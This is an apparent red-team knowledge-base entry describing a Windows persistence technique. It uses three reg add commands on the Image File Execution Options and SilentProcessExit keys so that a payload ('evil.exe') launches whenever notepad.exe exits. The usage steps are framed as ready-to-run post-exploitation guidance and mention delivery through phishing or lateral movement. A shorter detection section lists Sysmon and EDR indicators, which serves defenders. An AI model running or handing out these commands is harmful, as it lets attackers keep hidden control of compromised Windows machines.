---
id: 0cbab15b-3623-482c-a272-56656b62f631
name: PowerShell-Registry-Persistence-GlobalFlag-Script
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:28.047643+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - persistence
  - registry
  - globalflag
validated: true
---

# PowerShell-Registry-Persistence-GlobalFlag-Script

## Code

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\$PAYLOAD_PATH"
```

## Description

This PowerShell script configures Windows registry for silent process exit monitoring on notepad.exe, enabling persistence by launching a specified payload whenever notepad.exe exits silently. It sets GlobalFlag to enable monitoring, ReportingMode to activate reporting, and MonitorProcess to the payload path.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $PAYLOAD_PATH | Full path to the malicious executable to launch on exit | evil.exe |

## Usage

Execute this script in an elevated PowerShell session during post-exploitation to establish persistence. First, stage your payload (e.g., copy evil.exe to C:\temp\), then substitute $PAYLOAD_PATH and run the script. Test by opening and force-closing notepad.exe to verify payload execution. This can be delivered via initial access vectors like phishing or lateral movement.

## Detection

- Monitor PowerShell execution logs for reg.exe invocations (Module Logging, Script Block Logging)
- Sysmon Event ID 13 for registry modifications in Image File Execution Options or SilentProcessExit keys
- Unusual process creations from notepad.exe exits or GlobalFlag=512 values in registry scans
- EDR alerts on repeated launches of suspicious binaries tied to benign process monitoring

## Related

- [[procedures/Elevated-Registry-Persistence-with-GlobalFlag]]
- [[tools/Reg-EXE]]
